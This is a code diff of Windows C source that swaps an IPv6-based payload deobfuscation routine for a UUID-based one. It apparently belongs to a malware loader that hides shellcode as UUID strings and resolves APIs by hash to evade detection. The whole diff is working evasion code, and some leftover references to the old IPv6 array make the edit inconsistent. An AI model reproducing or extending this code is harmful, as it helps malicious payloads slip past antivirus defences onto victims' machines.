@@ -1,22 +1,25 @@
-#include "obfuscation.h"
+#include "encoders.h"
 
 
-typedef NTSTATUS (NTAPI* fnRtlIpv6StringToAddressA)(
-        PCSTR                   S,
-        PCSTR*                  Terminator,
-        PVOID                   Addr
+typedef RPC_STATUS (WINAPI* fnUuidFromStringA)(
+        RPC_CSTR        StringUuid,
+        UUID*           Uuid
 );
 
 
-BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize) {
+BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize) {   
         PBYTE           pBuffer         = NULL, TmpBuffer       = NULL;
         SIZE_T          sBuffSize       = 0;
         PCSTR           Terminator      = NULL;
         NTSTATUS        STATUS          = STATUS_SUCCESS;
         
-        // getting RtlIpv6StringToAddressA  address from ntdll.dll
-        fnRtlIpv6StringToAddressA  pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
-        if (pRtlIpv6StringToAddressA == NULL) {
+        // getting UuidFromStringA   address from Rpcrt4.dll
+#ifdef UNICODE
+        fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddressH(LoadLibrary(L"rpcrt4.dll"), L"UuidFromStringA");
+#else
+        fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddressH(LoadLibrary("rpcrt4.dll"), "UuidFromStringA");
+#endif
+        if (pUuidFromStringA == NULL) {
                 DebugPrint("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
                 return FALSE;
         }
@@ -34,10 +37,10 @@ BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE
         
         // loop through all the addresses saved in Ipv6Array
         for (int i = 0; i < NmbrOfElements; i++) {
-                // Ipv6Array[i] is a single ipv6 address from the array Ipv6Array
-                if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {
+                // UuidArray[i] is a single UUid address from the array UuidArray
+                if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
                         // if failed ...
-                        DebugPrint("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X\n", Ipv6Array[i], STATUS);
+                        DebugPrint("[!] UuidFromStringA  Failed At [%s] With Error 0x%0.8X\n", UuidArray[i], STATUS);
                         return FALSE;
                 }
                 
